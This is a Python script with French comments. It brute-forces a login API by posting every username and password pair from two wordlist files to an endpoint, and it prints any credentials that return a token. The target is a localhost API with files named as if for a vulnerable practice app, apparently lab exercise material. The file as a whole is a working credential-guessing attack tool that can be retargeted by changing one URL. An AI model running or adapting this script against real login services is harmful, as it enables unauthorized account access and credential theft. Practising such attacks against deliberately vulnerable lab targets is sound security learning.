import requests

def force_brute_website(api_url, username_file, password_file):
    """
    Teste les combinaisons de noms d'utilisateur et de mots de passe sur un endpoint API.
    
    :param api_url: URL de l'endpoint API pour l'authentification.
    :param username_file: Chemin vers le fichier contenant les noms d'utilisateur.
    :param password_file: Chemin vers le fichier contenant les mots de passe.
    """
    try:
        # Charger les noms d'utilisateur et mots de passe
        with open(username_file, 'r') as uf:
            usernames = [line.strip() for line in uf]
        
        with open(password_file, 'r') as pf:
            passwords = [line.strip() for line in pf]
        
    except FileNotFoundError as e:
        print(f"Erreur : {e}")
        return

    headers = {
        'Content-Type': 'application/json',  # Remplacez si nécessaire
    }

    print(f"Début des tests sur {api_url}...")
    for username in usernames:
        for password in passwords:
            # Construire les données POST pour le formulaire
            payload = {
                'username': username,  # Remplacez par les clés réelles du JSON attendu
                'password': password
            }

            # Envoyer la requête POST
            response = requests.post(api_url, json=payload, headers=headers)

            # Vérifier si l'authentification réussit (ajustez selon l'API)
            if response.status_code == 200 and "token" in response.json():  # Exemple de succès
                print(f"[SUCCÈS] Username: {username}, Password: {password}")
                return

            print(f"[Échec] Username: {username}, Password: {password}")

    print("Aucune combinaison valide trouvée.")

# Utilisation
api_url = "http://localhost:5000/users/v1/login"  # Endpoint réel de l'API
username_file = "vulName.txt"  # Chemin vers le fichier des noms d'utilisateur
password_file = "vulMdp.txt"  # Chemin vers le fichier des mots de passe

force_brute_website(api_url, username_file, password_file)
